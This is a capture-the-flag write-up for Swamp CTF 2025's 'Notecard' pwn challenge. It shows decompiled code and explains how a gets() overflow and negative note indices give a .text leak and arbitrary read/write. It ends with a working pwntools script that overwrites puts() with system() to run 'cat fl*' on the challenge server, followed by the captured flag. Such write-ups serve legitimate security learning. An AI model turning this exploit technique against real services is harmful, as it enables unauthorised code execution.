---
title: Notecard
date: 2025-03-30T23:02:58+03:00
description: Writeup for Notecard [Swamp CTF 2025]
type: writeup
author: sunbather
tags:
- pwn
draft: false
---
___

## Challenge Description

I wrote a service that allows students to create and retrieve their own notecards! What do you think?

## Intuition

The program is basically a note taking program. Here is the `main()` function:

```c
undefined8 main(void)
{
  long lVar1;
  undefined8 uVar2;
  long in_FS_OFFSET;
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  setbuf(_stdin,(char *)0x0);
  setbuf(_stdout,(char *)0x0);
  printf("Welcome to Note! Your one stop shop for all notecard needs!\n");
  uVar2 = alloc();
  FUN_001013f0(uVar2);
  if (*(long *)(in_FS_OFFSET + 0x28) == lVar1) {
    return 0;
  }
  __stack_chk_fail();
}
```

Firstly, the `alloc()` function allocates some memory on the heap for the notes.
Then it puts their pointers in an array on the heap to access them more easily:

```c
undefined4 * alloc(void)
{
  char *pcVar1;
  undefined4 *puVar2;
  long in_FS_OFFSET;
  int i;
  char *ptrs [5];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  for (i = 0; i < 5; i = i + 1) {
    pcVar1 = (char *)malloc(0x28);
    ptrs[i] = pcVar1;
  }
  puVar2 = (undefined4 *)malloc(0x28);
  *(char **)(puVar2 + 8) = ptrs[4];
  puVar2[4] = ptrs[2]._0_4_;
  puVar2[5] = ptrs[2]._4_4_;
  puVar2[6] = ptrs[3]._0_4_;
  puVar2[7] = ptrs[3]._4_4_;
  *puVar2 = ptrs[0]._0_4_;
  puVar2[1] = ptrs[0]._4_4_;
  puVar2[2] = ptrs[1]._0_4_;
  puVar2[3] = ptrs[1]._4_4_;
  if (*(long *)(in_FS_OFFSET + 0x28) == local_10) {
    return puVar2;
  }
  __stack_chk_fail();
}
```

Then the next function is an interactive menu for the note taking application:

```c
void FUN_001013f0(code *param_1)
{
  code *pcVar1;
  ulong uVar2;
  undefined8 extraout_RDX;
  char local_4d;
  uint opt;
  char *local_48 [6];
  
  memset(local_48,0,0x30);
  local_4d = 'y';
  while (local_4d != 'n') {
    puts("Please enter your name:");
    gets((char *)local_48);
    printf("Your name is ");
    puts((char *)local_48);
    printf("\nChange it? (y/n)?\n",local_48);
    __isoc99_scanf("%c",&local_4d);
    __isoc99_scanf("%c",&DAT_00104079);
  }
  pcVar1 = print_note;
  local_48[3] = (char *)exit;
  local_48[4] = (char *)print_note;
  local_48[5] = (char *)write_note;
  printf("Hello %s!\n",local_48);
  do {
    while( true ) {
      while( true ) {
        printf("0 - exit\n1 - read\n2 - write\n> \n");
        uVar2 = (ulong)pcVar1 & 0xffffffffffffff00;
        __isoc99_scanf("%d",&opt);
        pcVar1 = (code *)(uVar2 & 0xffffffffffffff00);
        __isoc99_scanf("%c",&DAT_00104079,extraout_RDX,pcVar1);
        opt = opt & 3;
        if (opt != 0) break;
        printf("Goodbye ");
        puts((char *)local_48);
        pcVar1 = (code *)0x0;
        (*(code *)local_48[3])(0);
      }
      if (opt == 1) break;
      if (opt == 2) {
        pcVar1 = param_1;
        (*(code *)local_48[5])(param_1);
      }
    }
    pcVar1 = param_1;
    (*(code *)local_48[4])(param_1);
  } while( true );
}
```

Essentially, the program asks for your name and contains an overflow with the `gets()` call.
Sadly overflowing the return address does nothing because the function never returns.

But, we can write more than the possible size. Which is useful later, because multiple function pointers are placed on the stack after the name.

If our name is longer than the allowed size, we can get a `.text` leak at the `printf()` call, because it lacks a NULL byte.

Furthermore, the `write_note()` and `print_note()` functions lack lower-bound checking on the index, shown below:

```c
void print_note(char **param_1)
{
  long in_FS_OFFSET;
  int local_14;
  long local_10;
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  printf("Notecard number (0 - 4): ");
  __isoc99_scanf("%d",&local_14);
  __isoc99_scanf("%c",&DAT_00104079);
  if (local_14 < 5) {
    puts(param_1[local_14]);
  }
  else {
    printf("You are using the free version of Note and only have 5 note cards!\n");
  }
  if (*(long *)(in_FS_OFFSET + 0x28) == local_10) {
    return;
  }
  __stack_chk_fail();
}

void write_note(char **param_1)
{
  long in_FS_OFFSET;
  int local_14;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  printf("Notecard number (0 - 4): ");
  __isoc99_scanf("%d",&local_14);
  __isoc99_scanf("%c",&DAT_00104079);
  if (local_14 < 5) {
    read(0,param_1[local_14],0x28);
  }
  else {
    printf("You are using the free version of Note and only have 5 note cards!\n");
  }
  if (*(long *)(in_FS_OFFSET + 0x28) == local_10) {
    return;
  }
  __stack_chk_fail();
}
```

The array from which notes are selected looks like this on the heap:

```
0x555555559380	0x0000000000000000	0x0000000000000031	........1.......
0x555555559390	0x00005555555592a0	0x00005555555592d0	..UUUU....UUUU..
0x5555555593a0	0x0000555555559300	0x0000555555559330	..UUUU..0.UUUU..
0x5555555593b0	0x0000555555559360	0x0000000000020c51	`.UUUU..Q.......
```

Notice how it stores a bunch of pointers to other heap memory.
But if we can access negative indices, we can go to other places in the heap and select pointers from there.
Then, the program uses those pointers to figure out where to read and write.

So if we can inject pointers before this note array, we can get arbitrary read/write.
Luckily, right before the array there are a bunch of notes, for which we control the content.
From then it's a classic GOT leak and then overwrite on `puts()`:

1. Choose a name that overflows to leak `.text` pointers.
2. Write a note that contains a pointer to the GOT of `puts()`.
3. Read a note from a negative index that lands exactly on the injected pointer, leaking libc ASLR slide.
4. Figure out from the leak what libc the server is using. (libc not given w/ the challenge)
5. Write a note to a negative index that lands exactly on the injected pointer, overwriting `puts()` with `system()`.
6. Exit the interactive menu, which ends up calling `puts(name)`. Great, so just set name to `cat flag.txt;aaaa[...]`.

## Solution

```py
#!/usr/bin/env python3

from pwn import *
import time

#target = process("./notecard")
target = remote("chals.swampctf.com", 40002)

target.recvuntil(b"name:")

# Set name to "cat fl*;aaaaaaaa..."
target.sendline(b"cat fl*;" + b"a" * 0x25)
print(target.recv(0x48+8))
target.recvline()
time.sleep(1) # idk what's up with the remote but seems like sleeping makes it a bit more reliable
target.sendline(b"n")
target.recvline()
target.recvline()

# leak .text pointers
leak = target.recvline()[30:-2] + b"\x00\x00"
print(leak)
base = u64(leak) - 0x1270
print(hex(base))


puts_got = base + 0x4018

# Write puts_got address somewhere on the heap, inside a note
target.recvuntil(b">")
target.sendline(b"2")
target.recvuntil(b"4): ")
target.sendline(b"4")
target.sendline(p64(puts_got))

# Go to index -6, where our puts_got address will be, and read from it
# This will double dereference so [notes - 6] --> [puts_got] --> PUTS_LIBC_ADDR
target.recvuntil(b">")
target.sendline(b"1")
target.recvuntil(b"4): ")
target.sendline(b"-6")
target.sendline(p64(puts_got))

puts_leak = target.recvline()[:-1] + b"\x00\x00"
print(puts_leak)
print(hex(u64(puts_leak)))

# figure out the offsets by finding the remote libc with blukat
remote_system = u64(puts_leak) - 0x2f490

# Go to index -6 again to overwrite the address of puts with system
# This will double dereference so [notes - 6] --> [puts_got] --> PUTS_LIBC_ADDR
target.recvuntil(b">")
target.sendline(b"2")
target.recvuntil(b"4): ")
target.sendline(b"-6")
print("WRITING TO PUTS")
target.sendline(p64(remote_system))


# For some reason 0 doesn't work here
# So still have to send 0 manually once interactive
target.sendline(b"0")
target.interactive()
```

### Flag

```
$ ./solve.py 
[+] Opening connection to chals.swampctf.com on port 40002: Done
b'\n'
b'pb\xff\x1b?V\x00\x00'
0x563f1bff5000
b'\xd0\xcb\x0c\xf2\xa7\x7f\x00\x00'
0x7fa7f20ccbd0
WRITING TO PUTS
[*] Switching to interactive mode
\xd0\xcb\x0c\xa7\x7f
0 - exit
1 - read
2 - write
> 
Notecard number (0 - 4): \xd0\xcb\x0c\xa7\x7f
0 - exit
1 - read
2 - write
> 
Notecard number (0 - 4): \xd0\xcb\x0c\xa7\x7f
0 - exit
1 - read
2 - write
> 
Notecard number (0 - 4): \xd0\xcb\x0c\xa7\x7f
0 - exit
1 - read
2 - write
> 
Notecard number (0 - 4): 0 - exit
1 - read
2 - write
> 
$ 0
Goodbye swampCTF{5tudy_h@rd_@nd_5t@y_1n_5ch00l}
```
